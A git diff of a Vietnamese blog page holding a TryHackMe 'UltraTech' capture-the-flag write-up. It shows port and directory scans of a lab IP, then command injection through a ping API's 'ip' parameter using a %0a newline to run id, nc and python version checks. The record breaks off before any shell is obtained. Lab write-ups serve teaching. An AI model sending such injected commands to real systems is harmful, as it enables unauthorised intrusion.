@@ -248,13 +248,13 @@
 </div>
   <div class="links-of-author site-overview-item animated">
       <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
         <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
         <a href="https://www.facebook.com/minhnq22" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://instagram.com/minhnq22" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;minhnq22" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
       </span>
   </div>
 
@@ -347,39 +347,207 @@
         <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link: <a target="_blank" rel="noopener" href="https://tryhackme.com/room/ultratech1">https://tryhackme.com/room/ultratech1</a><br>Difficulty: Medium (Nhưng thực ra khá dễ)</p>
 <p>Mở ra Task 1 có phầm mở đầu khá dài, anh em thích đọc thì đọc, còn không thì nhấn vào cái nút Deploy màu xanh kia mà bắt đầu cho đỡ mất thời gian.<br>TryHackMe mỗi lần Deploy sẽ ra một địa chỉ IP Lab khác nhau, nếu cảm thấy may mắn có thể đem mấy con số đó đi đánh đề.<br>Lần này con số may mắn của tôi là 10.10.3.122, tiếc cái lúc này đã quá 18h30 nên không còn tiết mục quay số xanh đỏ nữa, hmm…</p>
 <a id="more"></a>
-<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A -v 10.10.3.122 </span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)</span><br><span class="line">|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)</span><br><span class="line">|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)</span><br><span class="line">8081&#x2F;tcp open  http    Node.js Express framework</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-none"><code class="language-none">$ nmap -A -v 10.10.3.122 
+PORT     STATE SERVICE VERSION
+21&#x2F;tcp   open  ftp     vsftpd 3.0.3
+22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
+8081&#x2F;tcp open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).
+Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Trước mắt là vớ được 3 cổng 21-FTP, 22-SSH và 8081-HTTP, theo sau là phiên bản của từng dịch vụ chạy trên các cổng đó.<br>Tất nhiên nếu dùng option -A của nmap thì chỉ mới phát hiện được các cổng tiêu biểu, chứ chưa thể liệt kê được tất cả các cổng đang được mở public trên server.<br>Để ý trong câu hỏi thuộc Task 2, có câu <em>Which other non-standard port is used?</em> và câu trả lời bên dưới có dạng *****, nghĩa là cổng này có 5 chữ số, trong khoảng từ 10000-65535, việc cần làm là phải tìm ra nó cái đã. Lại Nmap thôi :D</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 10000-65535 -T5 10.10.3.122</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">...</span><br><span class="line">31070&#x2F;tcp filtered unknown</span><br><span class="line">31146&#x2F;tcp filtered unknown</span><br><span class="line">31331&#x2F;tcp open     unknown</span><br><span class="line">31396&#x2F;tcp filtered unknown</span><br><span class="line">31610&#x2F;tcp filtered unknown</span><br><span class="line">31777&#x2F;tcp filtered unknown</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ nmap -p 10000-65535 -T5 10.10.3.122
+PORT      STATE    SERVICE
+...
+31070&#x2F;tcp filtered unknown
+31146&#x2F;tcp filtered unknown
+31331&#x2F;tcp open     unknown
+31396&#x2F;tcp filtered unknown
+31610&#x2F;tcp filtered unknown
+31777&#x2F;tcp filtered unknown
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Lúc chờ script này hoàn thành, tôi đã xem được hết trận Navi với Astralis.<br>Tóm được cổng 31331 đang mở, trốn kỹ đấy tml. Giờ thì xem xem thế lực nào đứng đằng sau nó.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 31331 -sC -sV 10.10.3.122  </span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">31331&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ nmap -p 31331 -sC -sV 10.10.3.122  
+PORT      STATE SERVICE VERSION
+31331&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Apache! Server này đang chạy 2 cổng HTTP, méo biết để làm gì. Mở cả 2 cái web của nó lên xem thế nào đã.<br><img src="pic1.png"><br><img src="pic2.png"></p>
 <h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><p>Chạy dirsearch với cổng 8081.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;dirsearch.py -e php,txt,html -u http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;</span><br><span class="line"></span><br><span class="line">[22:03:13] Starting: </span><br><span class="line">[22:03:53] 200 -   39B  - &#x2F;auth</span><br><span class="line">[22:03:53] 200 -   39B  - &#x2F;auth&#x2F;</span><br><span class="line">[22:04:26] 500 -    1KB - &#x2F;ping</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ .&#x2F;dirsearch.py -e php,txt,html -u http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;
+
+[22:03:13] Starting: 
+[22:03:53] 200 -   39B  - &#x2F;auth
+[22:03:53] 200 -   39B  - &#x2F;auth&#x2F;
+[22:04:26] 500 -    1KB - &#x2F;ping
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Truy cập vào /auth/, có thông báo <em>You must specify a login and a password</em>, có thể hình dung đây là một API, và cổng 8081 được dùng để chạy cung cấp API cho web server cổng 31331.<br>Thử thêm param vào cho API /auth (<a target="_blank" rel="noopener" href="http://10.10.3.122:8081/auth/?login=admin&amp;password=admin">http://10.10.3.122:8081/auth/?login=admin&amp;password=admin</a>), nhận lại vỏn vẹn dòng <em>Invalid credentials</em>. Okay :(<br>Còn với ping thì sao (<a target="_blank" rel="noopener" href="http://10.10.3.122:8081/ping">http://10.10.3.122:8081/ping</a>)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot read property &#39;replace&#39; of undefined</span><br><span class="line">    at app.get (&#x2F;home&#x2F;www&#x2F;api&#x2F;index.js:45:29)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at cors (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;cors&#x2F;lib&#x2F;index.js:188:7)</span><br><span class="line">    at &#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;cors&#x2F;lib&#x2F;index.js:224:17</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">TypeError: Cannot read property &#39;replace&#39; of undefined
+    at app.get (&#x2F;home&#x2F;www&#x2F;api&#x2F;index.js:45:29)
+    at Layer.handle [as handle_request] (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)
+    at next (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)
+    at Route.dispatch (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)
+    at Layer.handle [as handle_request] (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)
+    at &#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22
+    at Function.process_params (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)
+    at next (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)
+    at cors (&#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;cors&#x2F;lib&#x2F;index.js:188:7)
+    at &#x2F;home&#x2F;www&#x2F;api&#x2F;node_modules&#x2F;cors&#x2F;lib&#x2F;index.js:224:17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Lỗi trả về cho thấy API đang yêu cầu param, nhưng đéo ai biết param nó đang cần là gì. Với hình dung là việc API này cung cấp dịch vụ Ping, tôi nghĩ đến việc có thể lợi dụng nó để chèn lệnh (Command Injection) và lấy shell. Mường tượng ra là như thế, giờ phải đi tìm cách để sử dụng cái API Ping này cái đã.<br>Quay lại với web server trên cổng 31331, khá chắc kèo là ở đây sẽ có đoạn code nào đó để gọi các API mà phía cổng 8081 cung cấp, từ đây có thể xác định được param cần thiết cho API là gì.<br>Chạy dirsearch trên cổng 31331.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -e php,txt,html -u http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;</span><br><span class="line"></span><br><span class="line">[22:14:10] 301 -  317B  - &#x2F;css  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;css&#x2F;</span><br><span class="line">[22:14:16] 200 -   15KB - &#x2F;favicon.ico</span><br><span class="line">[22:14:19] 301 -  320B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;images&#x2F;</span><br><span class="line">[22:14:19] 200 -    4KB - &#x2F;images&#x2F;</span><br><span class="line">[22:14:20] 200 -    6KB - &#x2F;index.html</span><br><span class="line">[22:14:21] 301 -  324B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;javascript&#x2F;</span><br><span class="line">[22:14:22] 301 -  316B  - &#x2F;js  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;js&#x2F;</span><br><span class="line">[22:14:22] 200 -    1KB - &#x2F;js&#x2F;</span><br><span class="line">[22:14:39] 200 -   53B  - &#x2F;robots.txt</span><br><span class="line">[22:14:40] 403 -  302B  - &#x2F;server-status</span><br><span class="line">[22:14:40] 403 -  303B  - &#x2F;server-status&#x2F;</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;dirsearch.py -e php,txt,html -u http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;
+
+[22:14:10] 301 -  317B  - &#x2F;css  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;css&#x2F;
+[22:14:16] 200 -   15KB - &#x2F;favicon.ico
+[22:14:19] 301 -  320B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;images&#x2F;
+[22:14:19] 200 -    4KB - &#x2F;images&#x2F;
+[22:14:20] 200 -    6KB - &#x2F;index.html
+[22:14:21] 301 -  324B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;javascript&#x2F;
+[22:14:22] 301 -  316B  - &#x2F;js  -&gt;  http:&#x2F;&#x2F;10.10.3.122:31331&#x2F;js&#x2F;
+[22:14:22] 200 -    1KB - &#x2F;js&#x2F;
+[22:14:39] 200 -   53B  - &#x2F;robots.txt
+[22:14:40] 403 -  302B  - &#x2F;server-status
+[22:14:40] 403 -  303B  - &#x2F;server-status&#x2F;
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Tìm kiếm trong các thư mục có status 200. Các thư mục như /css/, /images/, /javascript/, /js/ thì thường tôi hay bị bỏ qua. Hoặc có vào thì cũng chỉ xem lướt lướt. Cơ mà lần này do đéo biết mò mẫm ở đâu để kiếm thêm thông tin nữa, nên tôi mở chúng lên xem.<br>Có một điều lạ, là /javascript/ và /js/, ủa, js là viết tắt của javascript mà, sao lại phải chia ra làm 2 thư mục? Truy cập vào để thấy điều hay ho, /javascript/ từ chối truy cập, còn /js/ thì tèn ten…</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parent Directory	 </span><br><span class="line">[ ]	api.js      2019-03-22 18:06 	883</span><br><span class="line">[ ]	app.js      2019-03-22 18:06    43K</span><br><span class="line">[ ]	app.min.js  2019-03-22 18:06    19K</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Parent Directory	 
+[ ]	api.js      2019-03-22 18:06 	883
+[ ]	app.js      2019-03-22 18:06    43K
+[ ]	app.min.js  2019-03-22 18:06    19K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Và api.js</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    console.warn(&#39;Debugging ::&#39;);</span><br><span class="line"></span><br><span class="line">    function getAPIURL() &#123;</span><br><span class="line">	return &#96;$&#123;window.location.hostname&#125;:8081&#96;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function checkAPIStatus() &#123;</span><br><span class="line">	const req &#x3D; new XMLHttpRequest();</span><br><span class="line">	try &#123;</span><br><span class="line">	    const url &#x3D; &#96;http:&#x2F;&#x2F;$&#123;getAPIURL()&#125;&#x2F;ping?ip&#x3D;$&#123;window.location.hostname&#125;&#96;</span><br><span class="line">	    req.open(&#39;GET&#39;, url, true);</span><br><span class="line">	    req.onload &#x3D; function (e) &#123;</span><br><span class="line">		if (req.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">		    if (req.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">			console.log(&#39;The api seems to be running&#39;)</span><br><span class="line">		    &#125; else &#123;</span><br><span class="line">			console.error(req.statusText);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;;</span><br><span class="line">	    req.onerror &#x3D; function (e) &#123;</span><br><span class="line">		console.error(xhr.statusText);</span><br><span class="line">	    &#125;;</span><br><span class="line">	    req.send(null);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (e) &#123;</span><br><span class="line">	    console.error(e)</span><br><span class="line">	    console.log(&#39;API Error&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    checkAPIStatus()</span><br><span class="line">    const interval &#x3D; setInterval(checkAPIStatus, 10000);</span><br><span class="line">    const form &#x3D; document.querySelector(&#39;form&#39;)</span><br><span class="line">    form.action &#x3D; &#96;http:&#x2F;&#x2F;$&#123;getAPIURL()&#125;&#x2F;auth&#96;;</span><br><span class="line">    </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">(function() &#123;
+    console.warn(&#39;Debugging ::&#39;);
+
+    function getAPIURL() &#123;
+	return &#96;$&#123;window.location.hostname&#125;:8081&#96;
+    &#125;
+    
+    function checkAPIStatus() &#123;
+	const req &#x3D; new XMLHttpRequest();
+	try &#123;
+	    const url &#x3D; &#96;http:&#x2F;&#x2F;$&#123;getAPIURL()&#125;&#x2F;ping?ip&#x3D;$&#123;window.location.hostname&#125;&#96;
+	    req.open(&#39;GET&#39;, url, true);
+	    req.onload &#x3D; function (e) &#123;
+		if (req.readyState &#x3D;&#x3D;&#x3D; 4) &#123;
+		    if (req.status &#x3D;&#x3D;&#x3D; 200) &#123;
+			console.log(&#39;The api seems to be running&#39;)
+		    &#125; else &#123;
+			console.error(req.statusText);
+		    &#125;
+		&#125;
+	    &#125;;
+	    req.onerror &#x3D; function (e) &#123;
+		console.error(xhr.statusText);
+	    &#125;;
+	    req.send(null);
+	&#125;
+	catch (e) &#123;
+	    console.error(e)
+	    console.log(&#39;API Error&#39;);
+	&#125;
+    &#125;
+    checkAPIStatus()
+    const interval &#x3D; setInterval(checkAPIStatus, 10000);
+    const form &#x3D; document.querySelector(&#39;form&#39;)
+    form.action &#x3D; &#96;http:&#x2F;&#x2F;$&#123;getAPIURL()&#125;&#x2F;auth&#96;;
+    
+&#125;)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Ở trên có thể thấy param của API này là “ip”. Nói đến đoạn này tôi cũng thấy mình ngu, ping thì chỉ có ping ip, domain thôi, chứ ai đi ping con gà con vịt? Thế mà đéo thử từ đầu cho đỡ mất thời gian.</p>
-<h3 id="API-Command-Injection"><a href="#API-Command-Injection" class="headerlink" title="API Command Injection"></a>API Command Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.016 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.016&#x2F;0.016&#x2F;0.016&#x2F;0.000 ms </span><br></pre></td></tr></table></figure>
+<h3 id="API-Command-Injection"><a href="#API-Command-Injection" class="headerlink" title="API Command Injection"></a>API Command Injection</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost
+
+PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.016 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.016&#x2F;0.016&#x2F;0.016&#x2F;0.000 ms <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>Chạy mượt ngay =)) ping localhost mà không mượt thì thôi đấy. Thử chèn lệnh các kiểu xem sao.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0aid</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.017 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.017&#x2F;0.017&#x2F;0.017&#x2F;0.000 ms</span><br><span class="line">uid&#x3D;1002(www) gid&#x3D;1002(www) groups&#x3D;1002(www) </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0aid
+
+PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.017 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.017&#x2F;0.017&#x2F;0.017&#x2F;0.000 ms
+uid&#x3D;1002(www) gid&#x3D;1002(www) groups&#x3D;1002(www) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Toang, dấu phân tách ở đây tôi dùng là %0a, tương ứng với ký tự ngắt dòng.<br>Từ đoạn này tôi quay sang dùng Postman để gọi API, anh em có thể dùng Burp Suite, nó cũng chả khác mẹ gì trình duyệt đâu, chỉ là hiển thị cho đẹp thôi.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0anc</span><br><span class="line"></span><br><span class="line">usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]</span><br><span class="line">[-m minttl] [-O length] [-P proxy_username] [-p source_port]</span><br><span class="line">[-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]</span><br><span class="line">[-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0anc
+
+usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
+[-m minttl] [-O length] [-P proxy_username] [-p source_port]
+[-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
+[-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Thấy là netcat ở đây không có option -e, tìm cách khác, xem xem có python, perl, rubi các thứ không…</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0apython --version</span><br><span class="line"></span><br><span class="line">Python 2.7.15rc1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.10.3.122:8081&#x2F;ping?ip&#x3D;localhost%0apython3 --version</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes</span><br><span class="line">64 bytes from localhost6.localdomain6 (::1): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.016 ms</span><br><span class="line"></span><br><span class="line">--- localhost ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt 